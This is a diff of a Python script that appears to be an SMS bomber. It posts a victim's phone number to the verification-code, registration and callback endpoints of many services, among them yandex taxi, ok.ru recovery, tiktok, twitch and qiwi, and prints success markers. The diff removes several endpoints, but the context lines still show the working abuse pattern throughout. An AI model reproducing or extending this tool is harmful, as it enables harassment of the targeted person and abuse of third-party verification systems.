@@ -138,19 +138,7 @@ try:
                         except:
                             print(colored('icq-[-]', 'yellow'))
                         try:
-                            requests.post(
-                                "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
-                                data={"phone": userr, "is_repeat": 0, "order_guid": 1},
-                            )
-                            print(colored('dns-shop.ru-[+]', 'magenta'))
-                        except:
-                            print(colored('dns-shop.ru-[-]', 'magenta'))
-                        try:
-                            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode",
-                                              json={"phone": "+" + userr}, headers=headers)
-                            print(colored('lenta.com-[+]', 'blue'))
-                        except:
-                            print(colored('lenta.com-[-]', 'blue'))
+ 
                         try:
                             a = requests.post("https://taxi.yandex.ru/3.0/auth",
                                               json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": userr},
@@ -183,24 +171,12 @@ try:
                         except:
                             print(colored('eda.yandex-[-]', 'yellow'))
                         try:
-                            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
-                                              data={"phone": userr}, headers=headers)
-                            print(colored('shop.vsk-[+]', 'green'))
-                        except:
-                            print(colored('shop.vsk-[-]', 'green'))
-                        try:
                             a = requests.post(
                                 "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                                 data={"st.r.phone": "+" + userr}, headers=headers)
                             print(colored('ok.ru-[+]', 'blue'))
                         except:
                             print(colored('ok.ru-[-]', 'blue'))
-                        try:
-                            a = requests.post("https://nn-card.ru/api/1.0/register",
-                                              json={"phone": userr, "password": 'DDd7873456'}, headers=headers)
-                            print(colored('nn-card-[+]', 'cyan'))
-                        except:
-                            print(colored('nn-card-[-]', 'cyan'))
                         try:
                             a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                               json={"CellPhone": userr[1:]}, headers=headers)
@@ -237,12 +213,6 @@ try:
                             print(colored('webbankir-[+]', 'magenta'))
                         except:
                             print(colored('webbankir-[-]', 'magenta'))
-                        try:
-                            a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
-                                              json={"phone": userr[1:], "name": "Егор"}, headers=headers)
-                            print(colored('stavropol-[+]', 'yellow'))
-                        except:
-                            print(colored('stavropol-[-]', 'yellow'))
                         try:
                             a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                               json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
@@ -282,12 +252,6 @@ try:
                             print(colored('qiwi-[+]', 'magenta'))
                         except:
                             print(colored('qiwi-[-]', 'magenta'))
-                        try:
-                            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
-                                              json={"phone": "+" + userr}, headers=headers)
-                            print(colored('tiktok-[+]', 'yellow'))
-                        except:
-                            print(colored('tiktok-[-]', 'yellow'))
                         try:
                             a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                                               json={
